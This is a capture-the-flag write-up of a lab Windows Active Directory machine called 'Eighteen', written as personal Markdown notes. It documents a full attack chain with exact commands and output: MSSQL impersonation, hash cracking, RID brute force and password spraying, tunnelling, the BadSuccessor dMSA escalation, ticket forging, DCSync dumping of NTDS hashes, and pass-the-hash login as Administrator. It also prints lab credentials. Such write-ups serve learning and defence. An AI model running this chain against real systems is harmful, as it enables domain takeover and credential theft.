---
created: 2025-11-18
---

📅 `2025-11-18`

#active-directory #mssql #impersonation #kerberos #cve #dcsync #password-cracking #password-reuse

----

## 🖥️ Box Info

| ️🏷️ Name         |   `Eighteen`  |
| --------------- | --- |
| 📆 Release Date |   `2025-11-15`  |
| 🌐 IP Address   |  `10.129.8.217`   |
| 🖥️ OS           |  `Windows`   |
| 🎯 Difficulty   |  `Easy`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `AD`
- Assumed breach with credentials: `kevin`:`iNa2we6haRj2gaw!`
- `MSSQL` impersonation
- Username enumeration via `RID` brute force
- Password reuse
- `BadSuccessor` (2025 `CVE` targeting `dMSA`s, hard to get working)


**🛠️ Tools:**  

- `NetExec`
- `impacket-mssqlclient`
- `hashcat`

**📚 Learned:**  

- `ligolo-ng` has a hardcoded IP range of `240.0.0.0/4` that can be used to reach all internal ports on the machine running the agent. Just tunnel it to a route with `240.0.0.1/32`.
- `nxc smb ... --generate-krb5 <file>` is very useful. Its output can replace the whole contents of `/etc/krb5.conf`.
- It's possible to use `--rid-brute` with `mssql`.
- Use `-k` and `--use-kcache` to use the `.ccache` file for logging in with `NetExec` without providing a username or password.
- Use `impacket-getST` to get a service ticket for an impersonated user.

----

## 🌐 Port Scan

- **TCP**: 80, 1433, 5985

---

## 🔍 Enumeration

According to `NetExec`, the machine's hostname was `DC01`, but none of the usual Domain Controller ports were open, so a firewall was likely filtering them. The web app had no real functionality beyond registering and logging in, which hinted at a database.

The credentials given to us for user `kevin` worked on `mssql`. The user didn't have permissions for reading the `financial_planner` database. The `enum_impersonate` command of `impacket-mssqlclient` showed that I could impersonate user `appdev`.

```shell
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev
```

After doing that, I managed to read the database and extract the admin user's hash.

```
SQL (kevin  guest@master)> exec_as_login appdev
SQL (appdev  appdev@master)> use financial_planner
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
```

```
SQL (appdev  appdev@financial_planner)> select * from users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1
```

---

## 🪜 Foothold / User


The obvious next step was to crack it, but `hashcat` couldn't read its format, so I had to convert it.

>[!tip]
>I created an account with a known password to test the conversion. If my modified hash for it cracked, the format was right.

I ended up with this format (`base64` the salt and un-hex the hash and `base64` it, among other changes):

```
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

I cracked the hash from the database.

- `iloveyou1`

Then I ran `--rid-brute` over `mssql` to enumerate domain users. After gathering usernames I did a `WinRM` scan with the new user list and found creds.

```
nxc winrm -u users.txt -p iloveyou1
```

- `adam.scott`:`iloveyou1`

```
evil-winrm-py PS C:\Users\adam.scott\Desktop> ls


    Directory: C:\Users\adam.scott\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---        11/20/2025  12:50 PM             34 user.txt
```

---

## 🛡️ Privilege Escalation

This was the hardest part. I first enumerated the domain with `BloodHound`, but nothing interesting showed up, so I enumerated the user's permissions. Our user was in a group named `IT`. I enumerated the permissions of that group with `Get-DomainOU | Get-DomainObjectACL ...` and found that the `IT` group had `CreateChild` permissions on the `Staff` `OU`. This makes the domain vulnerable to `BadSuccessor`.

I had to connect over `Kerberos` for this, and the ports were closed, so I used a `ligolo-ng` feature to reach every local port on the host running the agent: add the route `240.0.0.1/32` to the tunnel interface, and that address reaches all of the target's internal ports. Then I pointed the domain at it in `/etc/hosts`: `240.0.0.1 eighteen.htb dc01.eighteen.htb`.

I got a ticket with `--generate-tgt <file>`.

```shell
nxc smb eighteen.htb -u adam.scott -p iloveyou1 --generate-tgt adam.ccache

export KRB5CCNAME=adam.ccache
```

`evil-winrm` does not do `Kerberos` authentication by default. I had to generate a `krb5.conf` file using `NetExec`'s `--generate-krb5 <file>` option and then use this `evil-winrm` command (`evil-winrm-py` was giving me errors here, even though it worked earlier):

```shell
evil-winrm -i dc01.eighteen.htb -r eighteen.htb
```

And I managed to log in using `Kerberos`.

The exploit is `BadSuccessor`, which abuses the new `dMSA` concept from Windows Server 2025. I downloaded an exploit, compiled it in Visual Studio and ran this command:

```shell
.\BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -dmsa test_dmsa -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname DC01 -user adam.scott -dc-ip 10.129.8.217
```

It created my malicious `dMSA` that impersonates Administrator. Now I need to get a ticket for it. In the output of that command there were `Rubeus` commands to continue with the exploit but they didn't work for me, so I switched to Linux tools.

```shell
$ getST.py -impersonate 'test_dmsa$' -dmsa -k -no-pass eighteen.htb/adam.scott -self
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating test_dmsa$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:77e93df74c4f863304f63f2feffae774ebfe89450866c79f3447c4860d3c15ce
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:e9bb7d35dad5aafeccdf8f953d30b31a
[*] EncryptionTypes.rc4_hmac:cfb872ee62d0d77630f7d97bf72a86d0
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in test_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

Now I was ready to `DCSync`.

```shell
$ export KRB5CCNAME=test_dmsa\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache

$ klist
Ticket cache: FILE:test_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
Default principal: test_dmsa$@eighteen.htb

Valid starting       Expires              Service principal
11/21/2025 07:37:13  11/21/2025 15:47:03  krbtgt/EIGHTEEN.HTB@EIGHTEEN.HTB
	renew until 11/22/2025 05:47:03
```

```shell
$ nxc smb dc01.eighteen.htb -k --use-kcache --ntds
SMB         dc01.eighteen.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:eighteen.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.eighteen.htb 445    DC01             [+] eighteen.htb\test_dmsa$ from ccache (Pwn3d!)
SMB         dc01.eighteen.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc01.eighteen.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
<SNIP>
```

```
$ evil-winrm-py -i dc01.eighteen.htb -u Administrator -H '0b133be956bfaddf9cea56701affddec'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc01.eighteen.htb:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

Rooted.
